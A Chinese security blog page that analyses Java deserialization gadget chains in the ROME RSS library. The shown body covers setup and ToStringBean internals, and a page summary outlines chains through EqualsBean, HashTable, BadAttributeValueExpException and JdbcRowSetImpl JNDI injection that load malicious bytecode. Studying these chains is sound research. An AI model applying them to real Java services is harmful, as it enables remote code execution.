<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>ROME攻击链分析 | stoocea</title><meta name="author" content="stoocea"><meta name="copyright" content="stoocea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="ROME攻击链分析"><meta name="application-name" content="ROME攻击链分析"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="ROME攻击链分析"><meta property="og:url" content="http://example.com/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><meta property="og:site_name" content="stoocea"><meta property="og:description" content="什么是 ROMEROME 是一个关于 RSS 和 Atom 格式的 java 框架那什么是 RSS 和 Atom 呢？RSS 全称：RDF Site Summary 或 Really Simple Syndication，中文翻译为简易信息聚合，也叫做聚合内容。它是一种消息来源的格式,主要作用用在聚"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"><meta property="article:author" content="stoocea"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"><meta name="description" content="什么是 ROMEROME 是一个关于 RSS 和 Atom 格式的 java 框架那什么是 RSS 和 Atom 呢？RSS 全称：RDF Site Summary 或 Really Simple Syndication，中文翻译为简易信息聚合，也叫做聚合内容。它是一种消息来源的格式,主要作用用在聚"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: undefined,
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: stoocea","link":"链接: ","source":"来源: stoocea","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'stoocea',
  title: 'ROME攻击链分析',
  postAI: '',
  pageFillDescription: '什么是 ROME, 环境搭建, ROME 组件分析, 0x01 ToStringBean, 0x02 EqualsBean, ROME 链流程分析, 0x01 ObjectBean利用链, 1x01 流程分析, 0x02 HashTable利用链, 0x03 BadAttributeValueExpException, 1x01 调用流程分析, 0x04 HotSwappableTargetSource 利用链, 1x01  功能分析, 1x02 流程利用分析, 2x01 hashMap 入口, 3x01 流程分析, 0x05 JdbcRowSetImpl利用链, 1x01 攻击实现, 0x06 EqualsBean链, 1x01 流程分析, 2x01 hashSet 分析, 2x02 攻击流程分析, 总结什么是是一个关于和格式的框架那什么是和呢全称或中文翻译为简易信息聚合也叫做聚合内容它是一种消息来源的格式主要作用用在聚合多个网站的更新内容并且能够自动通知网站订阅者同时能够以摘要的形式将信息呈现帮助订阅者快速游览比如的动态本身就是一个名词它更加具体的名称是中文译为供稿格式的诞生是为了解决在各个版本遇到的问题降低内容聚合的难度特地特出来的一种信息格式的内容需要通过阅读器查看而就是其中一个比较老的阅读器了环境搭建组件分析我们先看他的结构然后理解一下这个类是用来干什么的从名称我们可以得知它主要作用是用来打印信息的所有方法都是用来和要想将目标类信息打印出来首先就应该获取对应类信息那获取对应类信息最直接的就是方法了这里获取类属性值就是通过对应类的方法获取的我们重点看方法在有参方法中它会接收一段参数类字节码在经过信息处理和特征获取后他会经历一段循环用来循环遍历类中的方法并且在最后执行该方法循环里面是通过方法来获取方法的获取完方法之后还会经过一层的判断筛选条件如下首先当前方法数组的值不能为空不能是父类的方法过滤有参数的方法在经过这三层筛选之后直接方法调用与有参方法有联系的只有的无参方法了我们的思路是能够通过调用无参方法间接去调用有参的或者直接调有参也行这里最开始的思路是通过那条链子起手通过调用的方法进一步调到无参方法他也能作为一段链的最终触发点也就是调用方法触发点在它的方法中整体逻辑和的差不多都是获取到方法之后通过调用但由于他是方法的缘故要两者进行比较所以会两次调用方法来判断两者是否相等这一点在我们之后分析它的攻击链时会用到链流程分析利用链最后就是中最常见的通过链去加载字节码了如下写恶意字节码反射对复制常规的恶意字节码不为空的限制配置中的指定要出的类输出序列化的编码字符流程分析初步的断点打在方法处然后我们跟进其很熟悉的流程就不多做赘述了后续直接跟进到的这里会调用到的继续跟进由于刚才我们赋值的时候给赋值上了构造好的这里直接调的无参这里直接一路跟到有参就行先是通过方法获取到关于的包装类然后通过包装类的方法获取所有的方法这里第一个就是获取方法返回之后开始调用直接跟进跟进到的方法这里会调用方法后续就是加载恶意类的流程不过多赘述其实这条链子还是好分析毕竟大部分内容都是我们之前学过的只有中间方法会调用类中方法的特性是第一次接触利用链针对被的情况其实就是和的区别在的方法中他会对中的每一个元素都调用方法之前这里还存在一个碰撞的问题只不过具体的要进入循环调用方法我们这里需要调用到方法就行没必要考虑这个问题后面就是接利用链后段了调用栈如下如下把换成就行写恶意字节码反射对复制常规的恶意字节码不为空的限制配置中的指定要出的类输出序列化的编码字符流程就不跟进到了后程一样的他的方法能够直接调用方法调用的是的我们看看前面是通过反射然后获取到参数的值那我们也直接反射写入就行只不过这样利用链就稍微有点变化了我们可以直接调用的无参方法了调用栈如下如下写恶意字节码反射对复制常规的恶意字节码不为空的限制执行序列化与反序列化并且返回序列化数据输出序列化的编码字符调用流程分析稍微分析一下断点还是打在方法上跟进由于刚才我们对反射赋值了为类所以这里应该会直接到的一路跟进到有参调用后续就不跟了一样的流程利用链这条链子属于原生利用链也就是在目标有依赖的情况下可以尝试这条链子功能分析位于包下可以在代理运行的过程中动态实时更新对象也就是热加载其中的方法大多都是用来对目标的操作以及获取的相关信息为主至于利用链我们拼接了它的方法其中值是可控的直接构造方法中传值进去就行后续的调用涉及到这个类他是关于相关操作的类具体就不看了直接看它的方法最终调用到了的方法这里的赋值有点讲究我们回顾之前方法的内容方法的参数是并且这个的类型是本身所以我们这里需要两次实例化不同的第一次实例化构造为第二次实例化新的构造为这样才能保证被赋值为接着后续就是直接调用的方法就行流程利用分析后半段的流程已经分析完毕现在集中解决上半段触发的问题此时我脑海中有两种思路一种是通过的作为入口后续触发那一条还有一种思路是通过的去触发两者我都去尝试一下了是肯定是可以的但是要想触发方法就必须经过碰撞这里不是说我们不能满足碰撞而是我们现在的目标类他本身就不是类型导致我们无法字符串去绕过碰撞问题所以暂时只分析的入口当调用到方法时也会在其中调用到方法入口调用栈如下如下利用写恶意字节码反射对复制常规的恶意字节码不为空的限制流程分析入口点打在然后跟进到的方法然后持续跟进到循环处注意这里的第一次的传值是也就是我们中第一次的然后跟进来到第二次判断这里要使不等才能走进内容触发方法但是当前也就是当前这个所有内容为空所以不论我们现在算出来多少作为键中取出的一定是所以第一次进是无法触发后续链子的这也是为什么我们要两次实例化不同的后续就没有意义了就是走进判断成功的内容然后将我们第一个带有实体压入临时那么继续第二次的跟进此时算出来的键值可以正好在临时缓存中取到我们刚才压入的所以这里取出不为并且由于两次我们的作用对象都是类型两者的算出来一定是一样的所以前半段条件也会通过后续值就是我们第一次带有的了然后值就是我们本次带有的所以这里就可以跟进方法了分析到这里时我换了版本的依赖原因是肯定不与兼容升高会导致一些类找不到所以这里权衡之下选择降低的版本为方法有所区别了但思路依旧那么这里就开始调用的方法了被构造为了后续就是熟悉的流程了不跟进了利用链相信之前利用的时候应该很熟悉了只不过利用点完全不同是利用的方法中只会调用方法所以这里是调用其方法触发的这个方法是他调用了方法了又是熟悉的调用的方法引起的注入标记里面的参数我们保证可控跟进到了父类的方法他直接返回属性这里属性的设定依然还是要调用到的方法然后调用回的那参数可控的限制也解除现在只需要考虑入口点怎么选了其实前面的触发点都能够作为我们这里的入口点的攻击手段在反序列化中属于一个后续利用也就是说我们可以不用去通过加载恶意类实现了攻击实现先看的入口选择这里注入有很多选择自己本地起一个或者服务或者用其他工具起也行我这里用的输出序列化的编码字符链上文我们第一次分析链的时候就途径其实本身就能够当作和一类的最终触发点这里只不过要想调用方法需要通过其方法流程分析的组件分析文章开头分析过了这里就直接分析攻击链了其实这里也算是一个新的入口点对于方向的攻击来说只要能够触发到方法我们都能接着往下走所以前面还能换成的碰撞就不讲了但是的处理方式要讲一下跟的碰撞差不多都是利用两个字符串算出来的值相同分析我们来到它的方法相关的循环这里默认会被赋值为所以之后会调用的方法熟悉的调用第一次进由于缓存里面没有值所以第一次判断是否为空是一定满足不了的所以这里我们可能考虑要两次不然第二次进入会报空错想要调用到方法判断条件中第一个判断也必须过这里如果是直接两个就不用管算出来肯定一样但是后续就要考虑和同样的碰撞了第二次进入之后顺利来到下面的这层判断准备触发如果我们刚才直接给进其中传入方法的参数还是这也不行我们考虑其中加一层来包裹的方法会调用到它的抽象类的方法在它的方法中他首先会通过迭代器对我们当前作用能够访问到当前的各个键值对这里就是调用了方法取第二个键值对假设此时键值对然后取出它的和各为然后这里调用的方法参数是的键值是什么上面代码中制定了是我们当前的是我们刚才取出的也就是说它会在两个中相互取值这里比较绕我们之后看能明白些攻击流程分析上述难关通关后就可以正常调用链了如果思路没错的话我们直接看经测试不论是还是都能够这么用各自的条件都已经注释好了断点打在跟进然后顺利的来到循环第一次进肯定是不能够触发后续链的但他会先给缓存赋值把第一个存入进去我们直接跟进第二次此时两段算出来肯定是一样的我们只需关注值和值即可分别为我们本次循环的以及第一次被存入缓存的继续跟进方法值为我们传入的第一次的为关于第二个的迭代器迭代器第一次初始化取到的键值对默认为空所以它第一次就是取出我们第二个的第一个键值对也就是所以是字符串是创建好的最终转化为后续触发就是正常流程了的方法直接处理的结果所以跟进获取完方法之后开始第一次调用此时调用就是的方法之后就是加载恶意字节码的流程不过多赘述总结用的方式去触发链其实不只有方法可以作为入口点以及也不只作为最终恶意代码执行的点它和一样都只是作为攻击链其中的一部分不过最重要的点还是它两作为依赖中组件的特性就是会调用目标类的方法这也是存在恶意代码执行的必要条件我们学习链的时候要和链联系起来虽然是最开始我们学习反序列化的先导但其实两者是很像的分析链我最大的感受可能是对链等依赖中存在的攻击链新的认识其实就是分析项目中存在哪些依赖该依赖有没有漏洞点能不能作为我最终攻击的跳板',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-31 23:51:51',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">stoocea</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">ROME攻击链分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-03-31T15:50:00.000Z" title="发表于 2024-03-31 23:50:00">2024-03-31</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-03-31T15:51:51.776Z" title="更新于 2024-03-31 23:51:51">2024-03-31</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://bu.dusays.com/2024/03/11/65ee76f777226.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/post/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"><header><h1 id="CrawlerTitle" itemprop="name headline">ROME攻击链分析</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">stoocea</span><time itemprop="dateCreated datePublished" datetime="2024-03-31T15:50:00.000Z" title="发表于 2024-03-31 23:50:00">2024-03-31</time><time itemprop="dateCreated datePublished" datetime="2024-03-31T15:51:51.776Z" title="更新于 2024-03-31 23:51:51">2024-03-31</time></header><h1 id="什么是-ROME"><a href="#什么是-ROME" class="headerlink" title="什么是 ROME"></a>什么是 ROME</h1><p>ROME 是一个关于 RSS 和 Atom 格式的 java 框架<br>那什么是 RSS 和 Atom 呢？<br>RSS 全称：RDF Site Summary 或 Really Simple Syndication，中文翻译为简易信息聚合，也叫做聚合内容。它是一种消息来源的<strong>格式</strong>,主要作用用在聚合多个网站的更新内容，并且能够自动通知网站订阅者。同时 RSS 能够以摘要的形式将信息呈现，帮助订阅者快速游览。（比如 bilibili 的动态？）<br>Atom 本身就是一个名词，它更加具体的名称是 Atom Syndication Format ，中文译为 Atom 供稿格式。Atom 的诞生是为了解决 RSS 在各个版本遇到的问题，降低 web 内容聚合的难度，特地特出来的一种信息格式。<br>RSS 的内容需要通过 RSS 阅读器查看，而 ROME 就是其中一个比较老的 RSS 阅读器了。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>rome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javassist<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.28.0-GA<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>  
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="ROME-组件分析"><a href="#ROME-组件分析" class="headerlink" title="ROME 组件分析"></a>ROME 组件分析</h1><h2 id="0x01-ToStringBean"><a href="#0x01-ToStringBean" class="headerlink" title="0x01 ToStringBean"></a>0x01 ToStringBean</h2><p>我们先看他的结构<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711786873166-a019c7bc-d699-4975-9a12-ce257828840a.png#averageHue=%233b3d42&clientId=u15358810-29f9-4&from=paste&height=250&id=u63d3cb84&originHeight=469&originWidth=914&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=146572&status=done&style=none&taskId=ubde9bbb4-d6f0-4d85-b719-670a43bb34c&title=&width=487.46666666666664" referrerpolicy="no-referrer" alt="image.png"><br>然后理解一下这个类是用来干什么的？从名称我们可以得知，它主要作用是用来打印信息的，所有方法都是用来 print 和 toString。要想将目标类信息打印出来，首先就应该获取对应类信息，那获取对应类信息最直接的就是 get 方法了，这里获取类属性值就是通过对应类的 get 方法获取的<br>我们重点看 toString 方法<br>在 toString 有参方法中，它会接收一段 StringBuffer 参数（类字节码），在经过信息处理和特征获取后，他会经历一段 for 循环，用来循环遍历类中的 get 方法，并且在最后执行该 get 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711787054097-4ccd24c4-3ba2-4d81-adfd-bebfe56681e1.png#averageHue=%232c2f33&clientId=u15358810-29f9-4&from=paste&height=542&id=uaa7f0ce5&originHeight=1016&originWidth=1913&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=568791&status=done&style=none&taskId=u93a43d16-186d-4912-b554-aa5793f13ad&title=&width=1020.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>for 循环里面是通过<code>getReadMethod()</code>方法来获取 get 方法的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711787385126-fec8ca73-8f6f-400e-a327-601e9d82b751.png#averageHue=%232c2e33&clientId=u15358810-29f9-4&from=paste&height=484&id=u141c1995&originHeight=907&originWidth=1558&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=417497&status=done&style=none&taskId=ub2639b36-e651-4f05-b994-143866ca61d&title=&width=830.9333333333333" referrerpolicy="no-referrer" alt="image.png"><br>获取完 get 方法之后还会经过一层 if 的判断筛选，条件如下</p>
<blockquote>
<p>首先当前 get 方法数组的值不能为空<br>不能是 Object 父类的 get 方法<br>过滤有参数的 get 方法</p>
</blockquote>
<p>在经过这三层筛选之后，直接invoke 方法调用<br>与 toString 有参方法有联系的只有 toString 的无参方法了，我们的思路是能够通过调用 toString 无参方法间接去调用有参的 toString，或者直接调有参 toString 也行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711788629306-882803d8-154c-45c1-b6ce-a24c1167f0bc.png#averageHue=%232c2f33&clientId=u15358810-29f9-4&from=paste&height=410&id=u6e2f484c&originHeight=768&originWidth=1718&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=415957&status=done&style=none&taskId=u0742d6f1-80e4-4894-8e4f-aa090ed7207&title=&width=916.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>这里最开始的思路是通过 hashMap CC6 那条链子起手，通过调用**EqualsBean **的 beanHashCode()方法，进一步调到 toString 无参方法</p>
